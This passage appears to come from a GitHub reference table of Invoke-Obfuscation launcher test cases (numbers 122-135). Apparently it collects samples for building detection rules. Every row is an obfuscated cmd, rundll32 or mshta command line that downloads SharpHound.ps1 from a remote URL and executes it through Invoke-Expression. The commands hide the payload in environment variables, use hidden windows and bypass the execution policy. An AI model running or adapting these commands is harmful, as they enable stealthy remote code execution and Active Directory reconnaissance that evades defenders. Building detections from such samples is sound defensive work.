| 122 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\4 | c:\wIndoWs\SYsTeM32\CMD.eXe   /c "sEt   uqX=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&ruNDLl32.eXE SHELL32.DLL ShellExec_RunDLL  "POwERSHeLl"  "  -nOp"      "${eXecuTIONCoNTExt}.'inVoKEcOMmaNd'.('{0}{2}{1}{3}'-f 'iNV','eScrIp','oK','T' ).Invoke(  (    ^& ('{0}{1}' -f'g','Ci') ( '{1}{0}'-f 'V:uQx','eN' )).'ValUe'    )"
| 123 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\5 | cmd/c "sET   jvnY=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&c:\WInDOwS\systEM32\RUNDLl32.Exe   SHELL32.DLL,ShellExec_RunDLL "PoweRsHELl" " -CoMMa  "    "( .('Ls') ('{0}{1}{2}'-f'e','nV:jvn','Y'  )  ).'vAlUe'^| ^&  (  ${pshOME}[21]  + ${pshOME}[30]+  'x'  )"
| 124 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\6 | c:\WInDOWs\SySTEM32\CMd.exe  /c "sET  SjO=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&c:\wInDOWs\sYSteM32\rundlL32.eXe   SHELL32.DLL,ShellExec_RunDLL  "pOWERSHeLL" " -WI HIDdEn "     "$jNBe5  =[TypE]('{3}{1}{2}{0}'-F'ent','VIroN','M','EN')  ;       ^& ( ${veRBosepREFeREnCe}.(  '{1}{0}' -f 'oStriNG','T' ).Invoke(  )[1,3] +  'x'-JOiN'')( (  (  GET-VarIAblE (  'J'  + 'NBE5') ).ValuE::('{2}{3}{1}{0}'-f'LE','ENTVAriab','GE','TeNvIrOnm' ).Invoke('Sjo',(  '{1}{0}'-f'oCEsS','Pr')  )  ) ) "
| 125 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\7 | C:\wiNDows\sYStEm32\CMd.eXe   /c "SET  Dyr=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&c:\WiNDOws\systEm32\rUnDLl32.eXE SHELL32.DLL ShellExec_RunDLL   "PowERsHeLl"   "  -exE  bypasS"   "${EXEcuTiONCOnText}.'INVoKeCoMmAND'.('{3}{1}{0}{2}' -f 'p','rI','T','InvOkesc' ).Invoke(   ( .( '{0}{1}' -f'g','ci'  ) ( '{1}{0}'-f 'Nv:DYr','E'  )  ).'vALuE'    )"
| 126 | LAUNCHER | LAUNCHER\RUNDLL++ | LAUNCHER\RUNDLL++\8 | C:\WindoWs\SYSTem32\cmd.EXe   /c "SeT   sRnq=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&C:\WinDOwS\sYsTem32\RuNdLl32   SHELL32.DLL ,,,ShellExec_RunDLL "c:\windoWs\SySwOW64\wIndoWSpowERshELl\V1.0\pOWErSHeLL.exe"   "(.('{2}{1}{0}'-f'abLe','I','var'  ) ( '{3}{1}{5}{4}{0}{2}'-f 'n','C','TExt','ExE','TIONCO','U'  ) -VALU ).'inVOKEcOmmAnD'.(  '{0}{1}{2}{3}' -f'In','V','OkEScRIP','t'  ).Invoke( (   ^&  ( '{2}{1}{0}' -f 'ldItEM','Hi','GET-c') ('{1}{0}{2}'-f 'n','e','v:srnq') ).'ValUE'    )"

### MSHTA++ LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Result |
| :---: | :---: | :---: | :---: | :--- |
| 127 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\0 | cmD.EXe /c "set  NToc=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&c:\wINDOws\SYSTEM32\MsHta VBScriPt:CReAteOBjECt("WS"+"CrIpt.SH"+"ELL").RUN("PoweRshEll       ^&  ( ${eNV:ComSpEC}[4,15,25]-joiN''  )(  ( ^&  (  '{1}{0}'-f'eM','It'  ) ( '{2}{1}{0}' -f 'oC','Nt','ENV:' )).'vAlUe'  ) ",(10-2-7),TruE)(WiNDow.CLoSe)"
| 128 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\1 | CmD   /c  "Set  mrx=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&C:\winDoWs\SySteM32\msHTa.exe VBSCriPT:CREateObJECt("WScrIpt"+".SHel"+"L").RuN("PowERshELL  -Noex   ${ExECutioNcOnText}.'InVokECOmmANd'.( '{2}{3}{1}{0}' -f't','iP','inVOkESC','r' ).Invoke(  ( ^&( '{1}{0}'-f 'r','di') ('{1}{0}'-f 'v:mRx','En'  )  ).'VAlUe')",1,True)(WINdOW.CLOse)"
| 129 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\2 | Cmd   /c "Set   LbVG=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&mSHtA VBSCRiPT:CreateObJeCt("WScript.SHELL").RUN("PowERshEll -Nonin    ${ExECutIOnconteXT}.'INvoKEcoMmaND'.(  '{1}{2}{3}{0}' -f 'ript','Inv','oK','ESC'  ).Invoke((   ^&  ( 'gi'  ) ( '{0}{1}{2}' -f 'enV',':Lb','vg'  )  ).'vALUE'  )",1,TRue)(WINDoW.CLOsE)"
| 130 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\3 | Cmd.EXe   /C "SEt  CUgH=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&c:\windOwS\SYsTem32\MShTa.ExE  VBScRiPt:CrEATeObJEct("WS"+"c"+"RIPT.Sh"+"ell").RUN("pOWeRSHELl  -nOlog    (    ^&(  'Gi' ) ('{0}{1}{2}'-f 'En','V:CU','gh'  )).'VALUE'   ^|    . (  ${ENV:ComSpEC}[4,15,25]-JOin''  )",16-15,TRUE)(WiNdoW.ClOSE)"
| 131 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\4 | cmD.eXe/C  "SET   oiZ=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&MsHtA.exE   VBScriPT:CreaTeObJeCT("WScRiPt.ShelL").Run("powErsHELl -Nopr      ^& (   ${veRBOsEPreFEREnCe}.( '{1}{0}' -f 'TRing','TOs' ).Invoke( )[1,3]+ 'X'-JoIN''  )(  (  .('ls') ('{1}{0}{2}'-f'nV:','e','Oiz'  ) ).'VaLue'  )",(12-2-9),True)(Window.CLoSe)"
| 132 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\5 | CMd.ExE/c   "SEt   xFL=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&C:\WiNDOWS\sYsTeM32\mshTA  VBSCriPt:CREaTEOBJect("WSc"+"ript."+"SHe"+"l"+"L").RUN("pOweRShELl  -co   ${EXecUTIoNcoNteXT}.'INVoKEComMAnd'.(  '{1}{0}{2}'-f'Nv','i','okEscrIPt'  ).Invoke(   (.(  'Ls') (  '{0}{1}'-f'E','nV:xFL' )).'vAlUe'  )",5-4,TRue)(WiNdoW.CLOsE)"
| 133 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\6 | CMd.exE  /C "sEt  yoW=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&c:\WinDOws\sySTeM32\MShTa.Exe  VBScRiPT:CreAtEObjECt("WSCrip"+"t.SheL"+"l").RUN("poWershEll  -WIndoWstyL HiDdeN    ${exECutiONConTeXt}.'INVokeCoMMANd'.( '{0}{2}{1}'-f'INvOk','riPt','ESC').Invoke(  ( ^& ( '{3}{1}{2}{0}' -f 'm','-c','HIlDiTE','gET'  ) ( '{0}{1}{2}'-f 'eN','v:','yOW'  )  ).'vAlUe' )",(11-10-0),TRUE)(WinDOw.CLOsE)"
| 134 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\7 | CMD  /c  "sET  ofj=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&MshTA VBScRIPT:CReaTeObJeCt("W"+"SCRIP"+"T.SHE"+"lL").Run("poweRSHeLL  -EXeCuTioNpo  BYpass    ${eXEcUtIONcOnTExT}.'InVoKecOmmANd'.('{0}{1}{2}{3}'-f 'Inv','oK','eScrip','T'  ).Invoke(  (   ^&  (  '{2}{3}{0}{1}'-f'il','DiTeM','g','ET-Ch') ( '{1}{0}' -f 'v:oFj','eN')).'vALue'   )",1,TRUe)(WiNDOW.CLOSe)"
| 135 | LAUNCHER | LAUNCHER\MSHTA++ | LAUNCHER\MSHTA++\8 | CmD  /C  "SET   Ltf=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&MsHTA.eXE   VBSCRIpT:CrEaTEObjEcT("WScrIPt.SHEll").RUn("C:\wiNdOwS\sYsWOw64\WiNDOWspoWErSHelL\V1.0\POWERshElL.EXe    ^&   (   ( [stRiNg]${VERBoSePREfEREnCE}  )[1,3] + 'x'-jOIn'')((.(  '{1}{0}'-f 'I','Gc'  ) ( '{1}{2}{0}'-f 'f','ENv:','lt' ) ).'VAlue'  )",1,TrUE)(WINDOw.ClOse)"
